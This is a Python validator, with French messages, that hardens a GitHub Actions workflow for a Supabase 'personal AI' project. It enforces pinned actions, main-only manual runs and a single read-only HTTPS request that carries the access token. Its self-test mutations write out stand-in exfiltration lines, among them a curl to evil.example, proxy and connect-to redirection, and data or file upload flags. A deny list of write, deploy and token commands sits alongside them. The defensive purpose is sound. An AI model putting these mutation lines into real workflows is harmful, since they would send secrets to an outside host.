#!/usr/bin/env python3
from __future__ import annotations

from pathlib import Path
import re
import sys

ROOT = Path(__file__).resolve().parents[1]
WORKFLOW = ROOT / ".github" / "workflows" / "sinjira-v25-personal-ai-production-readiness.yml"

CHECKOUT = "actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803"
SETUP_PYTHON = "actions/setup-python@ece7cb06caefa5fff74198d8649806c4678c61a1"
SETUP_CLI = "supabase/setup-cli@3c2f5e2ae34c34e428e8e206e2c4d21fa2d20fbf"
PRODUCTION_URL = "https://api.supabase.com/v1/projects/gpvivleexywljowcqkru/database/migrations"
CONFIRMATION = "VERIFY-SINJIRA-V25-PERSONAL-AI"
TOKEN_REF = "SUPABASE_ACCESS_TOKEN: ${{ secrets.SUPABASE_ACCESS_TOKEN }}"

ALLOWED_USES = {CHECKOUT, SETUP_PYTHON, SETUP_CLI}

CONFIRMATION_INPUT = f'''\
      confirmation:
        description: "Saisir exactement {CONFIRMATION}"
        required: true
        type: string
'''

TOKEN_STEP = f'''\
      - name: Télécharger l'historique distant en lecture seule
        shell: bash
        env:
          {TOKEN_REF}
        run: |
          set -euo pipefail
          test -n "${{SUPABASE_ACCESS_TOKEN:-}}"
          curl --proto '=https' --fail-with-body --silent --show-error --request GET \\
            --url "{PRODUCTION_URL}" \\
            --header "Authorization: Bearer $SUPABASE_ACCESS_TOKEN" \\
            --header 'Accept: application/json' \\
            --output "$RUNNER_TEMP/personal-ai-production-migrations.json"
'''


def step_blocks(text: str) -> list[tuple[str, str]]:
    matches = list(re.finditer(r"(?m)^      - name: (.+)$", text))
    blocks: list[tuple[str, str]] = []
    for i, match in enumerate(matches):
        end = matches[i + 1].start() if i + 1 < len(matches) else len(text)
        blocks.append((match.group(1).strip(), text[match.start():end]))
    return blocks


def exact_line_count(text: str, line: str) -> int:
    return text.splitlines().count(line)


def errors(text: str) -> list[str]:
    out: list[str] = []

    required = (
        "workflow_dispatch:",
        "permissions:\n  contents: read",
        "concurrency:\n  group: sinjira-v25-personal-ai-production-verify\n  cancel-in-progress: false",
        "  verify-personal-ai-v25:",
        "    runs-on: ubuntu-24.04",
        "    timeout-minutes: 20",
        "    environment: production",
        'test "$GITHUB_REF" = "refs/heads/main"',
        f'test "$VERIFY_CONFIRMATION" = "{CONFIRMATION}"',
        f"uses: {CHECKOUT}",
        "          ref: main",
        "          persist-credentials: false",
        f"uses: {SETUP_PYTHON}",
        "          python-version: '3.12.14'",
        "          check-latest: false",
        "python3 scripts/validate_personal_ai_v25.py",
        "python3 scripts/validate_personal_ai_production_readiness.py",
        "python3 scripts/validate_production_schema_manifest.py",
        f"uses: {SETUP_CLI}",
        "          version: 2.111.0",
        "run: supabase db start",
        "run: supabase test db supabase/tests/personal_ai_v25.test.sql --local",
        'MIGRATION_HISTORY="$RUNNER_TEMP/personal-ai-production-migrations.json" python3 - <<\'PY\'',
        "if: always()",
        "run: supabase stop --no-backup || true",
    )
    for marker in required:
        if marker not in text:
            out.append(f"marqueur obligatoire absent: {marker}")

    if CONFIRMATION_INPUT not in text:
        out.append("l'input de confirmation doit rester requis, typé string et exact")

    for forbidden in (
        "pull_request:",
        "push:",
        "schedule:",
        "repository_dispatch:",
        "contents: write",
        "persist-credentials: true",
        "ubuntu-latest",
        "continue-on-error: true",
        "set -x",
        "supabase link",
        "supabase db push",
        "supabase functions deploy",
        "supabase secrets set",
        "supabase migration repair",
        "supabase db reset --linked",
        "--linked",
        "--no-verify-jwt",
        "service_role",
        "SERVICE_ROLE",
        "${{ github.token }}",
        "${{ github.token",
        "GITHUB_TOKEN:",
        "GH_TOKEN:",
        "gh api",
        "git push",
        "\nwget ",
        "\n          wget ",
        "curl -X POST",
        "curl --request POST",
        "curl -X PUT",
        "curl --request PUT",
        "curl -X PATCH",
        "curl --request PATCH",
        "curl -X DELETE",
        "curl --request DELETE",
    ):
        if forbidden in text:
            out.append(f"capacité interdite détectée: {forbidden.strip()}")

    if text.count("    runs-on:") != 1:
        out.append("exactement un job de vérification production est autorisé")
    if exact_line_count(text, "    environment: production") != 1:
        out.append("environment: production doit être porté exactement par le job de vérification")
    if exact_line_count(text, "          ref: main") != 1:
        out.append("checkout doit contenir exactement un ref: main")
    if exact_line_count(text, "          persist-credentials: false") != 1:
        out.append("checkout doit désactiver les credentials exactement une fois")

    uses = re.findall(r"(?m)^\s*uses:\s*([^\s#]+)", text)
    unexpected_uses = [value for value in uses if value not in ALLOWED_USES]
    if unexpected_uses:
        out.append("action réutilisable non autorisée/non épinglée: " + ", ".join(unexpected_uses))
    if uses.count(CHECKOUT) != 1 or uses.count(SETUP_PYTHON) != 1 or uses.count(SETUP_CLI) != 1:
        out.append("checkout, setup-python et setup-cli doivent chacun apparaître exactement une fois")

    blocks = dict(step_blocks(text))
    checkout = blocks.get("Checkout de main", "")
    if not checkout:
        out.append("étape Checkout de main absente")
    else:
        ref_lines = [line.strip() for line in checkout.splitlines() if line.strip().startswith("ref:")]
        if ref_lines != ["ref: main"]:
            out.append("checkout doit forcer uniquement ref: main")
        if "persist-credentials: false" not in checkout:
            out.append("checkout doit désactiver persist-credentials")
        if "secrets." in checkout or "github.token" in checkout:
            out.append("aucun secret/token ne doit être exposé à checkout")

    secret_lines = [line for line in text.splitlines() if "${{ secrets." in line]
    if secret_lines != [f"          {TOKEN_REF}"]:
        out.append("SUPABASE_ACCESS_TOKEN doit être l'unique secret et rester borné à une seule env d'étape")

    token_block = blocks.get("Télécharger l'historique distant en lecture seule", "")
    if not token_block:
        out.append("étape de lecture distante bornée absente")
    elif token_block.strip() != TOKEN_STEP.strip():
        out.append("l'étape portant SUPABASE_ACCESS_TOKEN doit rester exactement bornée au GET HTTPS Supabase autorisé")

    parse_block = blocks.get("Vérifier l'historique distant sans secret", "")
    if not parse_block:
        out.append("étape de vérification historique sans secret absente")
    else:
        if "secrets." in parse_block or "SUPABASE_ACCESS_TOKEN" in parse_block or "github.token" in parse_block:
            out.append("le parsing de l'historique doit rester séparé de tout secret/token")
        if 'MIGRATION_HISTORY="$RUNNER_TEMP/personal-ai-production-migrations.json"' not in parse_block:
            out.append("le parsing doit consommer uniquement le fichier temporaire produit par le GET borné")

    main_pos = text.find('test "$GITHUB_REF" = "refs/heads/main"')
    token_pos = text.find("secrets.SUPABASE_ACCESS_TOKEN")
    if main_pos < 0 or token_pos < 0 or main_pos > token_pos:
        out.append("le refus hors main doit précéder l'unique accès au secret")

    curl_lines = re.findall(r"(?m)^\s*curl\b.*$", text)
    if len(curl_lines) != 1:
        out.append("un seul appel curl est autorisé dans tout le workflow")
    if text.count(PRODUCTION_URL) != 1:
        out.append("l'URL production Supabase autorisée doit apparaître exactement une fois")
    if "SUPABASE_MANAGEMENT_API" in text or "SUPABASE_PROJECT_REF" in text:
        out.append("l'hôte/projet du GET sensible ne doivent pas être redirigeables par variable")

    return out


def validate(text: str) -> None:
    found = errors(text)
    if found:
        raise ValueError("; ".join(found))


def self_test(text: str) -> None:
    mutations = [
        ("runner mutable", text.replace("runs-on: ubuntu-24.04", "runs-on: ubuntu-latest", 1)),
        ("runner supplémentaire", text + "\n    runs-on: ubuntu-24.04\n"),
        ("checkout mutable", text.replace(CHECKOUT, "actions/checkout@v6", 1)),
        ("python mutable", text.replace(SETUP_PYTHON, "actions/setup-python@v6", 1)),
        ("python large", text.replace("python-version: '3.12.14'", "python-version: '3.x'", 1)),
        ("cli mutable", text.replace(SETUP_CLI, "supabase/setup-cli@v2", 1)),
        ("cli large", text.replace("version: 2.111.0", "version: latest", 1)),
        ("action inconnue", text + "\n      uses: owner/action@v1\n"),
        ("git write", text.replace("contents: read", "contents: write", 1)),
        ("credentials", text.replace("persist-credentials: false", "persist-credentials: true", 1)),
        ("checkout ref branche", text.replace("          ref: main", "          ref: ${{ github.ref }}", 1)),
        ("push trigger", text.replace("  workflow_dispatch:", "  push:\n    branches: [main]\n  workflow_dispatch:", 1)),
        ("schedule trigger", text.replace("  workflow_dispatch:", "  schedule:\n    - cron: '0 0 * * *'\n  workflow_dispatch:", 1)),
        ("remove main guard", text.replace('test "$GITHUB_REF" = "refs/heads/main"', "true", 1)),
        ("remove confirmation", text.replace(f'test "$VERIFY_CONFIRMATION" = "{CONFIRMATION}"', "true", 1)),
        ("confirmation différente", text.replace(CONFIRMATION, "VERIFY-OTHER", 1)),
        ("confirmation non requise", text.replace("        required: true", "        required: false", 1)),
        ("environment retiré", text.replace("    environment: production", "    # environment removed", 1)),
        ("secret job scoped", text.replace("    steps:", "    env:\n      SUPABASE_ACCESS_TOKEN: ${{ secrets.SUPABASE_ACCESS_TOKEN }}\n    steps:", 1)),
        ("secret dupliqué", text.replace("      - name: Vérifier l'historique distant sans secret", "      - name: Vérifier l'historique distant sans secret\n        env:\n          X: ${{ secrets.OTHER_SECRET }}", 1)),
        ("host exfiltration", text.replace("https://api.supabase.com", "https://evil.example", 1)),
        ("projet altéré", text.replace("gpvivleexywljowcqkru", "aaaaaaaaaaaaaaaaaaaa", 1)),
        ("méthode POST", text.replace("--request GET", "--request POST", 1)),
        ("méthode DELETE", text.replace("--request GET", "--request DELETE", 1)),
        ("retirer https only", text.replace("--proto '=https' ", "", 1)),
        ("redirect", text.replace("--request GET \\", "--request GET --location \\", 1)),
        ("data", text.replace("--request GET \\", "--request GET --data @payload \\", 1)),
        ("upload", text.replace("--request GET \\", "--request GET --upload-file payload \\", 1)),
        ("proxy", text.replace("--request GET \\", "--request GET --proxy https://evil.example \\", 1)),
        ("connect-to", text.replace("--request GET \\", "--request GET --connect-to api.supabase.com:443:evil.example:443 \\", 1)),
        ("resolve", text.replace("--request GET \\", "--request GET --resolve api.supabase.com:443:127.0.0.1 \\", 1)),
        ("second curl", text.replace('test -n "${SUPABASE_ACCESS_TOKEN:-}"', 'test -n "${SUPABASE_ACCESS_TOKEN:-}"\n          curl https://evil.example', 1)),
        ("python dans étape secret", text.replace('test -n "${SUPABASE_ACCESS_TOKEN:-}"', 'test -n "${SUPABASE_ACCESS_TOKEN:-}"\n          python3 -c "print(1)"', 1)),
        ("secret dans parsing", text.replace("      - name: Vérifier l'historique distant sans secret", "      - name: Vérifier l'historique distant sans secret\n        env:\n          SUPABASE_ACCESS_TOKEN: ${{ secrets.SUPABASE_ACCESS_TOKEN }}", 1)),
        ("variable management api", text.replace("env:\n  EMPLOYMENT_VERSION", "env:\n  SUPABASE_MANAGEMENT_API: https://evil.example\n  EMPLOYMENT_VERSION", 1)),
        ("variable project ref", text.replace("env:\n  EMPLOYMENT_VERSION", "env:\n  SUPABASE_PROJECT_REF: gpvivleexywljowcqkru\n  EMPLOYMENT_VERSION", 1)),
        ("linked", text + "\n# supabase db push --linked\n"),
        ("deploy", text + "\n# supabase functions deploy personal-ai\n"),
        ("secret write", text + "\n# supabase secrets set X=Y\n"),
        ("repair", text + "\n# supabase migration repair\n"),
        ("jwt bypass", text + "\n# --no-verify-jwt\n"),
        ("service role", text + "\n# service_role\n"),
        ("github token", text + "\n# ${{ github.token }}\n"),
        ("gh api", text + "\n# gh api /repos/x/y\n"),
        ("git push", text + "\n# git push origin main\n"),
        ("remove local flag", text.replace("personal_ai_v25.test.sql --local", "personal_ai_v25.test.sql", 1)),
        ("remove stop", text.replace("run: supabase stop --no-backup || true", "run: echo stop", 1)),
        ("remove always", text.replace("if: always()", "if: success()", 1)),
        ("remove validator ai", text.replace("python3 scripts/validate_personal_ai_v25.py", "python3 -V", 1)),
        ("remove readiness", text.replace("python3 scripts/validate_personal_ai_production_readiness.py", "python3 -V", 1)),
        ("remove manifest", text.replace("python3 scripts/validate_production_schema_manifest.py", "python3 -V", 1)),
        ("continue on error", text + "\n    continue-on-error: true\n"),
        ("shell trace", text.replace("set -euo pipefail", "set -x", 1)),
    ]
    missed: list[str] = []
    for name, mutated in mutations:
        try:
            validate(mutated)
        except ValueError:
            continue
        missed.append(name)
    if missed:
        raise ValueError("mutations non détectées: " + ", ".join(missed))
    print(f"OK: {len(mutations)}/{len(mutations)} mutations critiques détectées")


def main() -> int:
    if not WORKFLOW.is_file():
        print(f"ECHEC: workflow absent: {WORKFLOW.relative_to(ROOT)}", file=sys.stderr)
        return 1
    text = WORKFLOW.read_text(encoding="utf-8")
    try:
        if "--self-test" in sys.argv:
            validate(text)
            self_test(text)
        else:
            validate(text)
            print(
                "OK CI production-readiness Mon IA: lancement manuel main-only, actions/runtimes immuables, "
                "secret exposé à une seule étape shell au GET HTTPS Supabase exact, parsing sans secret "
                "et tests Supabase strictement locaux."
            )
    except ValueError as exc:
        print(f"ECHEC CI production-readiness Mon IA: {exc}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
